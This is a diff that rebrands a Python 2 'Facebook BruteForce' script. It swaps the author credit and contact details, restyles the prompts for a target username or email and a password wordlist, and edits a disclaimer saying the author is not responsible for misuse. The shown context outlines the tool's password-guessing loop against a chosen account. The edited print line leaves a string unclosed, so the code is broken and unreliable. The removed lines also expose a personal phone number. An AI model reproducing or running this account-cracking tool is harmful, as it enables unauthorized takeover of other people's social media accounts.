@@ -4,8 +4,8 @@
         
         #############################################
         #                                           #
-        #    Facebook BruteForce, by lovehacker     #
-        #    WhatsApp Contact:       03094161457    #
+        #    Facebook BruteForce, by Rana Aahil     #
+        #    Facebook Contact:       Aahil          #
         #                                           #
         #############################################
 
@@ -22,9 +22,9 @@ except ModuleNotFoundError:
     exit()
 
 time.sleep(0.5)
-user = raw_input('[?] Target Username/ID/Email >>> ')
+user = raw_input('[💀] Target Username/ID/Email >>?? ')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
+wrdlstFileName = raw_input('\n[💀] Wordlist Type pak.txt >> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
@@ -35,7 +35,7 @@ time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
-print '\n'##IM NOT RESPONSIBLE FOR ANY MISS USE AAHIL##\n'
+print"IM NOT RESPONSIBLE FOR ANY MISS USE AAHIL##
 for password in wordlist:
     if password == '' or password == ' ':
         pass
